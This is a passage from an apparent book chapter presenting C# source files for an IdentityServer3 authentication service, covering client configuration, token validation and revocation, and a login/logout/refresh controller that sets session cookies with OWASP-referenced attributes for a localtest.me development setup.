         <code class="n">app</code><code class="p">.</code><code class="n">UseTwitterAuthentication</code><code class="p">(</code><code class="n">twitter</code><code class="p">);</code>
      <code class="p">}</code>

      <code class="k">private</code> <code class="n">X509Certificate2</code> <code class="nf">LoadCertificate</code><code class="p">()</code> <code class="p">=&gt;</code> <code class="k">new</code> <code class="n">X509Certificate2</code><code class="p">(</code>
         <code class="err">$</code><code class="s">@"{AppDomain.CurrentDomain.BaseDirectory}\idsrv3test.pfx"</code><code class="p">,</code> <code class="s">"idsrv3test"</code>
      <code class="p">);</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<h5 id="leanpub-auto-architecture">Architecture</h5>


<img src="images/AuthArchitecture.png" alt="Auth Architecture"/>


<figure class="code">
  <figcaption>backend\Auth\AuthService.WebApi\AuthServiceWebApiConstants.cs</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// Lives in Auth Service of Architecture diagram above.</code>
<code class="k">namespace</code> <code class="nn">AuthService.WebApi</code> <code class="p">{</code>
   <code class="k">public</code> <code class="k">class</code> <code class="nc">AuthServiceWebApiConstants</code> <code class="p">{</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">AccessTokenValidationUrl</code> <code class="p">=</code>
         <code class="s">"https://identity.localtest.me:44334/connect/accesstokenvalidation?token="</code><code class="p">;</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">ClientConnectTokenUrl</code> <code class="p">=</code>
         <code class="s">"https://identity.localtest.me:44334/connect/token"</code><code class="p">;</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">ConnectionString</code> <code class="p">=</code> <code class="s">"AuthServiceDb"</code><code class="p">;</code>
      <code class="c1">// 1 day of seconds. Make sure this is equivalent to what the service layer</code>
      <code class="c1">// API is specifying.</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">int</code> <code class="n">UserAccessLifetime</code> <code class="p">=</code> <code class="m">86400</code><code class="p">;</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">ServiceLayerClientSecret</code> <code class="p">=</code>
         <code class="s">"9b28b73e-9f66-42bf-ba87-189569136b20"</code><code class="p">;</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">ServiceLayerClientId</code> <code class="p">=</code> <code class="s">"ServiceLayerClient"</code><code class="p">;</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">CookieName</code> <code class="p">=</code> <code class="s">"sessionId"</code><code class="p">;</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">int</code> <code class="n">TokenCleanupIntervalSeconds</code> <code class="p">=</code> <code class="m">60</code><code class="p">;</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>client\ServiceLayer\ServiceLayerConstants.cs</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// Lives in Service Layer APIs of Architecture diagram above.</code>
<code class="k">namespace</code> <code class="nn">ServiceLayer</code> <code class="p">{</code>
   <code class="k">public</code> <code class="k">class</code> <code class="nc">ServiceLayerConstants</code> <code class="p">{</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">AccessTokenValidationUrl</code> <code class="p">=</code>
         <code class="s">"https://identity.localtest.me:44334/connect/accesstokenvalidation?token="</code><code class="p">;</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">ClientConnectTokenUrl</code> <code class="p">=</code>
         <code class="s">"https://identity.localtest.me:44334/connect/token"</code><code class="p">;</code>
      <code class="c1">// Days. Make sure this is equivalent to what the auth service is specifying.</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">double</code> <code class="n">UserAccessLifetime</code> <code class="p">=</code> <code class="m">1</code><code class="p">;</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">ServiceLayerClientSecret</code> <code class="p">=</code>
         <code class="s">"9b28b73e-9f66-42bf-ba87-189569136b20"</code><code class="p">;</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">ServiceLayerClientId</code> <code class="p">=</code> <code class="s">"ServiceLayerClient"</code><code class="p">;</code>
      <code class="k">public</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">CookieName</code> <code class="p">=</code> <code class="s">"sessionId"</code><code class="p">;</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>backend\Auth\AuthService.WebApi\IdSvr\Clients.cs</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// Lives in Auth Service of Architecture diagram above.</code>
<code class="k">using</code> <code class="nn">System.Collections.Generic</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">IdentityServer3.Core</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">IdentityServer3.Core.Models</code><code class="p">;</code>

<code class="k">namespace</code> <code class="nn">AuthService.WebApi.IdSvrApi</code> <code class="p">{</code>
   <code class="k">public</code> <code class="k">static</code> <code class="k">class</code> <code class="nc">Clients</code> <code class="p">{</code>
      <code class="k">public</code> <code class="k">static</code> <code class="n">List</code><code class="p">&lt;</code><code class="n">Client</code><code class="p">&gt;</code> <code class="n">Get</code><code class="p">()</code> <code class="p">{</code>
         <code class="k">return</code> <code class="k">new</code> <code class="n">List</code><code class="p">&lt;</code><code class="n">Client</code><code class="p">&gt;</code> <code class="p">{</code>

            <code class="c1">// human is involved</code>
            <code class="k">new</code> <code class="n">Client</code> <code class="p">{</code>
               <code class="n">ClientName</code> <code class="p">=</code> <code class="s">"Silicon on behalf of Carbon Client"</code><code class="p">,</code>
               <code class="n">ClientId</code> <code class="p">=</code> <code class="n">AuthServiceWebApiConstants</code><code class="p">.</code><code class="n">ServiceLayerClientId</code><code class="p">,</code>
               <code class="n">Enabled</code> <code class="p">=</code> <code class="k">true</code><code class="p">,</code>
               <code class="n">AccessTokenType</code> <code class="p">=</code> <code class="n">AccessTokenType</code><code class="p">.</code><code class="n">Reference</code><code class="p">,</code>
               <code class="n">AccessTokenLifetime</code> <code class="p">=</code> <code class="n">AuthServiceWebApiConstants</code><code class="p">.</code><code class="n">UserAccessLifetime</code><code class="p">,</code>
               <code class="n">Flow</code> <code class="p">=</code> <code class="n">Flows</code><code class="p">.</code><code class="n">ResourceOwner</code><code class="p">,</code>

               <code class="n">RedirectUris</code> <code class="p">=</code> <code class="k">new</code> <code class="n">List</code><code class="p">&lt;</code><code class="kt">string</code><code class="p">&gt;</code> <code class="p">{</code>
                  <code class="s">"https://localtest.me:44334"</code>
               <code class="p">},</code>

               <code class="n">AllowedScopes</code> <code class="p">=</code> <code class="k">new</code> <code class="n">List</code><code class="p">&lt;</code><code class="kt">string</code><code class="p">&gt;</code> <code class="p">{</code>
                  <code class="n">Constants</code><code class="p">.</code><code class="n">StandardScopes</code><code class="p">.</code><code class="n">OpenId</code><code class="p">,</code>
                  <code class="n">Constants</code><code class="p">.</code><code class="n">StandardScopes</code><code class="p">.</code><code class="n">Profile</code><code class="p">,</code>
                  <code class="n">Constants</code><code class="p">.</code><code class="n">StandardScopes</code><code class="p">.</code><code class="n">Roles</code><code class="p">,</code>
                  <code class="n">Constants</code><code class="p">.</code><code class="n">StandardScopes</code><code class="p">.</code><code class="n">OfflineAccess</code><code class="p">,</code> <code class="c1">// For refresh tokens</code>
                  <code class="s">"microservice1"</code><code class="p">,</code>
                  <code class="s">"microservice2"</code><code class="p">,</code>
                  <code class="c1">// Etc.</code>
               <code class="p">},</code>

               <code class="n">ClientSecrets</code> <code class="p">=</code> <code class="k">new</code> <code class="n">List</code><code class="p">&lt;</code><code class="n">Secret</code><code class="p">&gt;</code> <code class="p">{</code>
                  <code class="k">new</code> <code class="nf">Secret</code><code class="p">(</code><code class="n">AuthServiceWebApiConstants</code><code class="p">.</code><code class="n">ServiceLayerClientSecret</code><code class="p">.</code><code class="n">Sha256</code><code class="p">())</code>
               <code class="p">},</code>
               <code class="cm">/*</code>
<code class="cm">               identityserver.github.io/Documentation/docs/configuration/clients.html</code>
<code class="cm">               Docs on how the config for the refresh token life-cycle works:</code>
<code class="cm">               identityserver.github.io/Documentation/docs/advanced/refreshTokens.html</code>
<code class="cm">               */</code>
               <code class="n">AbsoluteRefreshTokenLifetime</code> <code class="p">=</code> <code class="m">2592000</code><code class="p">,</code> <code class="c1">// Seconds: default of 30 days.</code>
               <code class="n">SlidingRefreshTokenLifetime</code> <code class="p">=</code> <code class="m">1296000</code><code class="p">,</code> <code class="c1">// Seconds: default of 15 days.</code>
               <code class="n">RefreshTokenUsage</code> <code class="p">=</code> <code class="n">TokenUsage</code><code class="p">.</code><code class="n">OneTimeOnly</code><code class="p">,</code>
               <code class="n">RefreshTokenExpiration</code> <code class="p">=</code> <code class="n">TokenExpiration</code><code class="p">.</code><code class="n">Sliding</code>
            <code class="p">}</code>
         <code class="p">};</code>
      <code class="p">}</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>client\ServiceLayer\Authentication\CookieRequestReader.cs</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// Lives in Service Layer API of Architecture diagram above.</code>
<code class="k">using</code> <code class="nn">System.Linq</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Net.Http</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Net.Http.Headers</code><code class="p">;</code>

<code class="k">namespace</code> <code class="nn">ServiceLayer.Authentication</code> <code class="p">{</code>
   <code class="c1">/// &lt;summary&gt;Reads any cookie value from the request&lt;/summary</code>
   <code class="k">public</code> <code class="k">static</code> <code class="k">class</code> <code class="nc">CookieRequestReader</code> <code class="p">{</code>
      <code class="k">public</code> <code class="k">static</code> <code class="kt">string</code> <code class="nf">GetCookieValue</code><code class="p">(</code><code class="n">HttpRequestMessage</code> <code class="n">request</code><code class="p">,</code> <code class="kt">string</code> <code class="n">cookieName</code><code class="p">)</code> <code class="p">{</code>
         <code class="n">CookieHeaderValue</code> <code class="n">cookie</code> <code class="p">=</code>
            <code class="n">request</code><code class="p">.</code><code class="n">Headers</code><code class="p">.</code><code class="n">GetCookies</code><code class="p">(</code><code class="n">cookieName</code><code class="p">).</code><code class="n">FirstOrDefault</code><code class="p">();</code>
         <code class="k">if</code> <code class="p">(</code><code class="n">cookie</code> <code class="p">!=</code> <code class="k">null</code><code class="p">)</code> <code class="k">return</code> <code class="n">cookie</code><code class="p">[</code><code class="n">cookieName</code><code class="p">].</code><code class="n">Value</code><code class="p">;</code>
         <code class="k">return</code> <code class="k">null</code><code class="p">;</code>
      <code class="p">}</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>client\ServiceLayer\Authentication\AuthServiceValidator.cs</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// Lives in Service Layer API of Architecture diagram above.</code>
<code class="k">using</code> <code class="nn">System.Collections.Generic</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.IO</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Net</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Net.Http</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Text</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Threading.Tasks</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Infrastructure.Logging</code><code class="p">;</code>

<code class="k">namespace</code> <code class="nn">ServiceLayer.Authentication</code> <code class="p">{</code>
   <code class="k">public</code> <code class="k">class</code> <code class="nc">AuthServiceValidator</code> <code class="p">:</code> <code class="n">IIdentityValidator</code> <code class="p">{</code>
      <code class="k">private</code> <code class="k">readonly</code> <code class="n">ILog</code> <code class="n">_log</code><code class="p">;</code>

      <code class="k">public</code> <code class="nf">AuthServiceValidator</code><code class="p">(</code><code class="n">ILog</code> <code class="n">log</code><code class="p">)</code> <code class="p">{</code>
         <code class="n">_log</code> <code class="p">=</code> <code class="n">log</code><code class="p">;</code>
      <code class="p">}</code>

      <code class="c1">// Called on each resource request other than login/outs.</code>
      <code class="k">public</code> <code class="kt">string</code> <code class="nf">GetTokenClaims</code><code class="p">(</code><code class="kt">string</code> <code class="n">token</code><code class="p">)</code> <code class="p">{</code>
         <code class="c1">// There's no cookie so no point checking with the auth service.</code>
         <code class="k">if</code> <code class="p">(</code><code class="kt">string</code><code class="p">.</code><code class="n">IsNullOrEmpty</code><code class="p">(</code><code class="n">token</code><code class="p">))</code> <code class="k">return</code> <code class="k">null</code><code class="p">;</code>

         <code class="kt">string</code> <code class="n">url</code> <code class="p">=</code> <code class="n">ServiceLayerConstants</code><code class="p">.</code><code class="n">AccessTokenValidationUrl</code> <code class="p">+</code> <code class="n">token</code><code class="p">;</code>

         <code class="n">HttpWebRequest</code> <code class="n">outgoingRequest</code> <code class="p">=</code> <code class="p">(</code><code class="n">HttpWebRequest</code><code class="p">)</code><code class="n">WebRequest</code><code class="p">.</code><code class="n">Create</code><code class="p">(</code><code class="n">url</code><code class="p">);</code>
         <code class="k">try</code> <code class="p">{</code>
            <code class="k">using</code> <code class="p">(</code><code class="n">HttpWebResponse</code> <code class="n">response</code> <code class="p">=</code>
               <code class="p">(</code><code class="n">HttpWebResponse</code><code class="p">)</code><code class="n">outgoingRequest</code><code class="p">.</code><code class="n">GetResponse</code><code class="p">())</code> <code class="p">{</code>
               <code class="k">if</code> <code class="p">(</code><code class="n">response</code><code class="p">.</code><code class="n">StatusCode</code> <code class="p">==</code> <code class="n">HttpStatusCode</code><code class="p">.</code><code class="n">OK</code><code class="p">)</code> <code class="p">{</code>
                  <code class="k">using</code> <code class="p">(</code><code class="n">Stream</code> <code class="n">stream</code> <code class="p">=</code> <code class="n">response</code><code class="p">.</code><code class="n">GetResponseStream</code><code class="p">())</code> <code class="p">{</code>
                     <code class="n">StreamReader</code> <code class="n">reader</code> <code class="p">=</code> <code class="k">new</code> <code class="n">StreamReader</code><code class="p">(</code><code class="n">stream</code><code class="p">,</code> <code class="n">Encoding</code><code class="p">.</code><code class="n">UTF8</code><code class="p">);</code>
                     <code class="kt">string</code> <code class="n">accessTokenValidationJson</code> <code class="p">=</code> <code class="n">reader</code><code class="p">.</code><code class="n">ReadToEnd</code><code class="p">();</code>
                     <code class="k">return</code> <code class="n">accessTokenValidationJson</code><code class="p">;</code>
                  <code class="p">}</code>
               <code class="p">}</code>

               <code class="n">_log</code><code class="p">.</code><code class="n">Warning</code><code class="p">(</code>
                  <code class="err">$</code><code class="s">"Received HTTP status code {response.StatusCode} when calling "</code> <code class="p">+</code>
                  <code class="s">"Identity Server token validation service."</code>
               <code class="p">);</code>
               <code class="k">return</code> <code class="k">null</code><code class="p">;</code>
            <code class="p">}</code>
         <code class="p">}</code> <code class="k">catch</code> <code class="p">(</code><code class="n">WebException</code> <code class="n">e</code><code class="p">)</code>
            <code class="n">when</code> <code class="p">(((</code><code class="n">HttpWebResponse</code><code class="p">)</code><code class="n">e</code><code class="p">.</code><code class="n">Response</code><code class="p">).</code><code class="n">StatusCode</code> <code class="p">==</code> <code class="n">HttpStatusCode</code><code class="p">.</code><code class="n">BadRequest</code><code class="p">)</code> <code class="p">{</code>
               <code class="k">return</code> <code class="k">null</code><code class="p">;</code>
         <code class="p">}</code>
      <code class="p">}</code>

      <code class="c1">// This addresses the faulty logout risk.</code>
      <code class="c1">// Called by SecureController.</code>
      <code class="k">public</code> <code class="k">async</code> <code class="n">Task</code><code class="p">&lt;</code><code class="kt">bool</code><code class="p">&gt;</code> <code class="n">LogMeOut</code><code class="p">(</code><code class="kt">string</code> <code class="n">token</code><code class="p">)</code> <code class="p">{</code>
         <code class="kt">string</code> <code class="n">tokenRevocationEndpoint</code> <code class="p">=</code>
            <code class="s">"https://identity.localtest.me:44334/connect/revocation"</code><code class="p">;</code>

         <code class="n">Dictionary</code><code class="p">&lt;</code><code class="kt">string</code><code class="p">,</code> <code class="kt">string</code><code class="p">&gt;</code> <code class="n">postBody</code> <code class="p">=</code> <code class="k">new</code> <code class="n">Dictionary</code><code class="p">&lt;</code><code class="kt">string</code><code class="p">,</code> <code class="kt">string</code><code class="p">&gt;</code> <code class="p">{</code>
            <code class="p">{</code> <code class="s">"token"</code><code class="p">,</code> <code class="n">token</code> <code class="p">},</code>
            <code class="p">{</code> <code class="s">"token_type_hint"</code><code class="p">,</code> <code class="s">"access_token"</code> <code class="p">}</code>
         <code class="p">};</code>
         <code class="n">HttpClient</code> <code class="n">client</code> <code class="p">=</code> <code class="k">new</code> <code class="n">HttpClient</code><code class="p">();</code>
         <code class="n">client</code><code class="p">.</code><code class="n">SetBasicAuthentication</code><code class="p">(</code>
            <code class="n">ServiceLayerConstants</code><code class="p">.</code><code class="n">ServiceLayerClientId</code><code class="p">,</code>
            <code class="n">ServiceLayerConstants</code><code class="p">.</code><code class="n">ServiceLayerClientSecret</code>
         <code class="p">);</code>
         <code class="n">HttpResponseMessage</code> <code class="n">response</code> <code class="p">=</code> <code class="k">await</code> <code class="n">client</code><code class="p">.</code><code class="n">PostAsync</code><code class="p">(</code>
            <code class="n">tokenRevocationEndpoint</code><code class="p">,</code>
            <code class="k">new</code> <code class="nf">FormUrlEncodedContent</code><code class="p">(</code><code class="n">postBody</code><code class="p">)</code>
         <code class="p">);</code>
         <code class="k">return</code> <code class="n">response</code><code class="p">.</code><code class="n">StatusCode</code> <code class="p">==</code> <code class="n">HttpStatusCode</code><code class="p">.</code><code class="n">OK</code><code class="p">;</code>
      <code class="p">}</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>


<figure class="code">
  <figcaption>client\ServiceLayer\APIControllers\SecureController.cs</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// Lives in Service Layer API of Architecture diagram above.</code>
<code class="k">using</code> <code class="nn">System</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Collections.Generic</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Web.Http</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Net.Http</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Net.Http.Headers</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Threading.Tasks</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">ServiceLayer.Authentication</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">IdentityModel.Client</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Infrastructure.IOC</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Infrastructure.Logging</code><code class="p">;</code>

<code class="k">namespace</code> <code class="nn">ServiceLayer.ApiControllers</code> <code class="p">{</code>

<code class="na">   [RoutePrefix("api/secure")]</code>
   <code class="k">public</code> <code class="k">class</code> <code class="nc">SecureController</code> <code class="p">:</code> <code class="n">ApiController</code> <code class="p">{</code>
      <code class="k">public</code> <code class="k">class</code> <code class="nc">LoginDto</code> <code class="p">{</code>
         <code class="k">public</code> <code class="kt">string</code> <code class="n">Username</code> <code class="p">{</code> <code class="k">get</code><code class="p">;</code> <code class="k">set</code><code class="p">;</code> <code class="p">}</code>
         <code class="k">public</code> <code class="kt">string</code> <code class="n">Password</code> <code class="p">{</code> <code class="k">get</code><code class="p">;</code> <code class="k">set</code><code class="p">;</code> <code class="p">}</code>
      <code class="p">}</code>

      <code class="c1">// TokenClient is an Identity Server component.</code>
      <code class="k">private</code> <code class="n">TokenClient</code> <code class="n">_tokenClient</code><code class="p">;</code>
      <code class="k">private</code> <code class="k">readonly</code> <code class="n">IIdentityValidator</code> <code class="n">_identityValidator</code><code class="p">;</code>

      <code class="k">public</code> <code class="nf">SecureController</code><code class="p">()</code> <code class="p">{</code>
         <code class="c1">//  TODO: Needs to use IoC to initialise the api controllers.</code>
         <code class="n">_identityValidator</code> <code class="p">=</code> <code class="k">new</code> <code class="n">AuthServiceValidator</code><code class="p">(</code><code class="n">Ioc</code><code class="p">.</code><code class="n">Get</code><code class="p">&lt;</code><code class="n">ILog</code><code class="p">&gt;());</code>

         <code class="n">_tokenClient</code> <code class="p">=</code> <code class="k">new</code> <code class="n">TokenClient</code><code class="p">(</code>
             <code class="n">ServiceLayerConstants</code><code class="p">.</code><code class="n">ClientConnectTokenUrl</code><code class="p">,</code>
             <code class="n">ServiceLayerConstants</code><code class="p">.</code><code class="n">ServiceLayerClientId</code><code class="p">,</code>
             <code class="n">ServiceLayerConstants</code><code class="p">.</code><code class="n">ServiceLayerClientSecret</code>
         <code class="p">);</code>
      <code class="p">}</code>

<code class="na">      [HttpPost]</code>
<code class="na">      [Route("login")]</code>
      <code class="k">public</code> <code class="n">HttpResponseMessage</code> <code class="nf">Login</code><code class="p">(</code><code class="n">LoginDto</code> <code class="n">login</code><code class="p">)</code> <code class="p">{</code>
         <code class="n">TokenResponse</code> <code class="n">tokenResponse</code> <code class="p">=</code> <code class="n">GetUserAccessToken</code><code class="p">(</code>
            <code class="c1">// Must include offline_access scope for refresh token.</code>
            <code class="k">new</code> <code class="n">Dictionary</code><code class="p">&lt;</code><code class="kt">string</code><code class="p">,</code> <code class="kt">string</code><code class="p">&gt;()</code> <code class="p">{</code>
               <code class="p">{</code> <code class="s">"userName"</code><code class="p">,</code> <code class="n">login</code><code class="p">.</code><code class="n">Username</code> <code class="p">},</code>
               <code class="p">{</code> <code class="s">"passWord"</code><code class="p">,</code> <code class="n">login</code><code class="p">.</code><code class="n">Password</code> <code class="p">},</code>
               <code class="p">{</code> <code class="s">"scope"</code><code class="p">,</code> <code class="s">"TaskService offline_access"</code> <code class="p">}</code>
            <code class="p">}</code>
         <code class="p">);</code>
         <code class="k">return</code> <code class="nf">CreateLoginResponse</code><code class="p">(</code><code class="n">tokenResponse</code><code class="p">);</code>
      <code class="p">}</code>

<code class="na">      [HttpGet]</code>
<code class="na">      [Route("logout")]</code>
      <code class="k">public</code> <code class="k">async</code> <code class="n">Task</code><code class="p">&lt;</code><code class="n">HttpResponseMessage</code><code class="p">&gt;</code> <code class="n">Logout</code><code class="p">()</code> <code class="p">{</code>
         <code class="n">CookieHeaderValue</code> <code class="n">cookie</code> <code class="p">=</code> <code class="k">new</code> <code class="n">CookieHeaderValue</code><code class="p">(</code>
            <code class="n">ServiceLayerConstants</code><code class="p">.</code><code class="n">CookieName</code><code class="p">,</code>
            <code class="kt">string</code><code class="p">.</code><code class="n">Empty</code>
         <code class="p">);</code>
         <code class="k">const</code> <code class="kt">int</code> <code class="n">yesterday</code> <code class="p">=</code> <code class="p">-</code><code class="m">1</code><code class="p">;</code>
         <code class="n">HttpResponseMessage</code> <code class="n">response</code> <code class="p">=</code> <code class="k">new</code> <code class="n">HttpResponseMessage</code><code class="p">();</code>
         <code class="kt">string</code> <code class="n">token</code> <code class="p">=</code> <code class="n">CookieRequestReader</code><code class="p">.</code><code class="n">GetCookieValue</code><code class="p">(</code>
            <code class="n">Request</code><code class="p">,</code>
            <code class="n">ServiceLayerConstants</code><code class="p">.</code><code class="n">CookieName</code>
         <code class="p">);</code>
         <code class="kt">bool</code> <code class="n">loggedOut</code> <code class="p">=</code> <code class="k">await</code> <code class="n">_identityValidator</code><code class="p">.</code><code class="n">LogMeOut</code><code class="p">(</code><code class="n">token</code><code class="p">);</code>

         <code class="n">cookie</code><code class="p">.</code><code class="n">MaxAge</code> <code class="p">=</code> <code class="n">TimeSpan</code><code class="p">.</code><code class="n">Zero</code><code class="p">;</code>
         <code class="n">cookie</code><code class="p">.</code><code class="n">Expires</code> <code class="p">=</code> <code class="n">DateTimeOffset</code><code class="p">.</code><code class="n">Now</code><code class="p">.</code><code class="n">AddDays</code><code class="p">(</code><code class="n">yesterday</code><code class="p">);</code>
         <code class="n">cookie</code><code class="p">.</code><code class="n">HttpOnly</code> <code class="p">=</code> <code class="k">true</code><code class="p">;</code>
         <code class="n">cookie</code><code class="p">.</code><code class="n">Domain</code> <code class="p">=</code> <code class="s">".localtest.me"</code><code class="p">;</code>
         <code class="n">cookie</code><code class="p">.</code><code class="n">Path</code> <code class="p">=</code> <code class="s">"/"</code><code class="p">;</code>

         <code class="n">response</code><code class="p">.</code><code class="n">Headers</code><code class="p">.</code><code class="n">AddCookies</code><code class="p">(</code><code class="k">new</code> <code class="n">CookieHeaderValue</code><code class="p">[]</code> <code class="p">{</code> <code class="n">cookie</code> <code class="p">});</code>
         <code class="n">response</code><code class="p">.</code><code class="n">Content</code> <code class="p">=</code> <code class="k">new</code> <code class="n">StringContent</code><code class="p">(</code><code class="err">$</code><code class="s">"{{\"LoggedOut\":\"{loggedOut}\"}}"</code><code class="p">);</code>
         <code class="k">return</code> <code class="n">response</code><code class="p">;</code>
      <code class="p">}</code>

      <code class="c1">// Used as part of the "remember me" strategy.</code>
      <code class="c1">// Front-end calls when new access token is required.</code>
<code class="na">      [HttpGet]</code>
<code class="na">      [Route("refreshsession")]</code>
      <code class="k">public</code> <code class="n">HttpResponseMessage</code> <code class="nf">RefreshSession</code><code class="p">(</code><code class="kt">string</code> <code class="n">refreshToken</code><code class="p">)</code> <code class="p">{</code>
         <code class="n">TokenResponse</code> <code class="n">response</code> <code class="p">=</code> <code class="n">_tokenClient</code><code class="p">.</code><code class="n">RequestRefreshTokenAsync</code><code class="p">(</code>
            <code class="n">refreshToken</code>
         <code class="p">).</code><code class="n">Result</code><code class="p">;</code>
         <code class="n">HttpResponseMessage</code> <code class="n">message</code> <code class="p">=</code> <code class="n">CreateLoginResponse</code><code class="p">(</code><code class="n">response</code><code class="p">);</code>
         <code class="k">return</code> <code class="n">message</code><code class="p">;</code>
      <code class="p">}</code>

      <code class="k">private</code> <code class="n">TokenResponse</code> <code class="nf">GetUserAccessToken</code><code class="p">(</code><code class="n">Dictionary</code><code class="p">&lt;</code><code class="kt">string</code><code class="p">,</code> <code class="kt">string</code><code class="p">&gt;</code> <code class="n">credsAndScope</code><code class="p">)</code> <code class="p">{</code>
         <code class="kt">var</code> <code class="n">req</code> <code class="p">=</code> <code class="n">_tokenClient</code><code class="p">.</code><code class="n">RequestResourceOwnerPasswordAsync</code><code class="p">(</code>
            <code class="n">credsAndScope</code><code class="p">[</code><code class="s">"userName"</code><code class="p">],</code>
            <code class="n">credsAndScope</code><code class="p">[</code><code class="s">"passWord"</code><code class="p">],</code>
            <code class="n">credsAndScope</code><code class="p">[</code><code class="s">"scope"</code><code class="p">]</code>
         <code class="p">);</code>
         <code class="k">return</code> <code class="n">req</code><code class="p">.</code><code class="n">Result</code><code class="p">;</code>
      <code class="p">}</code>

      <code class="k">private</code> <code class="n">HttpResponseMessage</code> <code class="nf">CreateLoginResponse</code><code class="p">(</code><code class="n">TokenResponse</code> <code class="n">tokenResponse</code><code class="p">)</code> <code class="p">{</code>
         <code class="n">CookieHeaderValue</code> <code class="n">cookie</code> <code class="p">=</code> <code class="k">new</code> <code class="n">CookieHeaderValue</code><code class="p">(</code>
            <code class="n">ServiceLayerConstants</code><code class="p">.</code><code class="n">CookieName</code><code class="p">,</code>
            <code class="n">tokenResponse</code><code class="p">.</code><code class="n">AccessToken</code>
         <code class="p">);</code>
         <code class="cm">/*</code>
<code class="cm">         owasp.org/index.php/Session_Management_Cheat_Sheet#Expire_and_Max-Age_Attributes</code>
<code class="cm">         */</code>
         <code class="n">cookie</code><code class="p">.</code><code class="n">Expires</code> <code class="p">=</code> <code class="n">DateTimeOffset</code><code class="p">.</code><code class="n">Now</code><code class="p">.</code><code class="n">AddDays</code><code class="p">(</code>
            <code class="n">ServiceLayerConstants</code><code class="p">.</code><code class="n">UserAccessLifetime</code>
         <code class="p">);</code>
         <code class="n">cookie</code><code class="p">.</code><code class="n">MaxAge</code> <code class="p">=</code> <code class="k">new</code> <code class="n">TimeSpan</code><code class="p">(</code>
            <code class="n">hours</code><code class="p">:</code> <code class="p">((</code><code class="kt">int</code><code class="p">)</code><code class="n">ServiceLayerConstants</code><code class="p">.</code><code class="n">UserAccessLifetime</code><code class="p">)</code> <code class="p">*</code> <code class="m">24</code><code class="p">,</code>
            <code class="n">minutes</code><code class="p">:</code> <code class="m">0</code><code class="p">,</code>
            <code class="n">seconds</code><code class="p">:</code> <code class="m">0</code>
         <code class="p">);</code>
         <code class="n">cookie</code><code class="p">.</code><code class="n">HttpOnly</code> <code class="p">=</code> <code class="k">true</code><code class="p">;</code>
         <code class="n">cookie</code><code class="p">.</code><code class="n">Secure</code> <code class="p">=</code> <code class="k">true</code><code class="p">;</code>
         <code class="cm">/*</code>
<code class="cm">         www.owasp.org/index.php/Session_Management_Cheat_Sheet#Domain_and_Path_Attributes</code>
<code class="cm">         Cosider prefixing with the host.</code>
<code class="cm">         */</code>
         <code class="n">cookie</code><code class="p">.</code><code class="n">Domain</code> <code class="p">=</code> <code class="s">".localtest.me"</code><code class="p">;</code>
         <code class="n">cookie</code><code class="p">.</code><code class="n">Path</code> <code class="p">=</code> <code class="s">"/"</code><code class="p">;</code>

         <code class="n">HttpResponseMessage</code> <code class="n">response</code> <code class="p">=</code> <code class="k">new</code> <code class="n">HttpResponseMessage</code><code class="p">();</code>
         <code class="n">response</code><code class="p">.</code><code class="n">Headers</code><code class="p">.</code><code class="n">AddCookies</code><code class="p">(</code><code class="k">new</code> <code class="n">CookieHeaderValue</code><code class="p">[]</code> <code class="p">{</code> <code class="n">cookie</code> <code class="p">});</code>
         <code class="n">response</code><code class="p">.</code><code class="n">Content</code> <code class="p">=</code> <code class="k">new</code> <code class="n">StringContent</code><code class="p">(</code>
            <code class="err">$</code><code class="s">"{{\"refreshToken\":\"{tokenResponse.RefreshToken}\"}}"</code>
         <code class="p">);</code>
         <code class="k">return</code> <code class="n">response</code><code class="p">;</code>
      <code class="p">}</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

